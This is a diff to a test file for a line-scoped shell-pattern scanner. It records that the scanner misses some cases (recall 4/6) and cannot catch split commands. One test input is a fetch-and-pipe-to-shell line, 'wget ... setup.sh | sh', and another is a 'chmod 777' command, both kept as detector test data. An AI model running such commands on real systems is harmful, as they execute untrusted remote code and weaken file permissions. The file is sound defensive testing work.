@@ -18,8 +18,14 @@ test("dangerous shell pattern only flagged for shell-like files", () => {
   assert.equal(scan(line, true).length, 1);
 });
 
-test("evaluation is perfect on the bundled fixtures", () => {
+test("evaluation exposes line-scoped and unsupported-tool misses", () => {
   const result = evaluateAll();
   assert.equal(result.precision, 1);
-  assert.equal(result.recall, 1);
+  assert.equal(result.recall, 4/6);
+  assert.equal(result.cases, 8);
+});
+
+test("split shell command is outside line-scoped detection", () => {
+  assert.deepEqual(scan("chmod\n777 example",true),[]);
+  assert.deepEqual(scan("wget https://example.invalid/setup.sh | sh",true),[]);
 });
